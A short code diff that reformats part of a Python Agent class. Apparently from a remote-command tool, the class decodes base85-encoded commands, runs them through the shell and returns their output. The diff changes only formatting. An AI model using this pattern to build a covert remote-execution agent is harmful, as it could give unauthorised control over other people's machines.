@@ -225,7 +225,13 @@ class Agent:
         logging.debug("Running a command")
         command = base64.b85decode(command).decode()
         logging.debug("Command: " + command)
-        sp = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+        sp = subprocess.Popen(
+            command,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            universal_newlines=True,
+        )
 
         sp_stdout = sp.stdout.read()
         self.respond(sp_stdout, "STDOUT")
@@ -233,7 +239,6 @@ class Agent:
         sp_stderr = sp.stderr.read()
         if sp_stderr != b"":
             self.respond(sp_stderr, "STDERR")
-
 
     def write_pid_file(self):
         my_pid = str(os.getpid())
